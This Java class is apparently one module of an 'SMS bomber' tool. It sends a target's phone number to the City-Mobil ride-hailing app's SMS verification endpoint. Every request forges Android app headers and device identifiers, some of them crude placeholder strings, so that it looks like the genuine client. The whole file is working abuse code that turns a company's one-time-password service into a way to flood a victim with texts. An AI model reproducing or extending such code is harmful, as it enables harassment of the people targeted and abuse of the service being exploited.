package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class Citimobil extends JsonService {

    public Citimobil() {
        setUrl("https://c-api.city-mobil.ru/client/v1/auth/phone/send");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("cm-market", "googlePlay");
        builder.addHeader("cm-app-os-name", "Android");
        builder.addHeader("cm-app-version", "4.75.1.1173");
        builder.addHeader("cm-app-os-version", "11");
        builder.addHeader("cm-app-os-android-api-version", "30");
        builder.addHeader("cm-device-time", "2021-08-14T02:45:39.635+05:00");
        builder.addHeader("cm-device", "abcdefghjklm12345");
        builder.addHeader("cm-session", "bruhhhh");
        builder.addHeader("cm-notification-token", "shshwjwjsjdj");
        builder.addHeader("User-Agent", "CMRider/4.75.1.1173 (Android 11; Xiaomi MABOBA; dick)");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("phone", getFormattedPhone());
            json.put("brand", "Redmi");
            json.put("model", "MABOBA");
            json.put("os_version", "11");
            json.put("adv_id", "random");
            json.put("android_id", "abcdefghjklm12345");
            json.put("ver", "4.75.1");
            json.put("appsflyer_id", "bruh");
            json.put("auth_token", "");
            json.put("devid", "abcdefghjklm12345");
            json.put("device_token", "random");
            json.put("id_device", "abcdefghjklm12345");
            json.put("locale", "ru");
            json.put("method", "v1/auth/phone/send");
            json.put("phone_os", "android");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
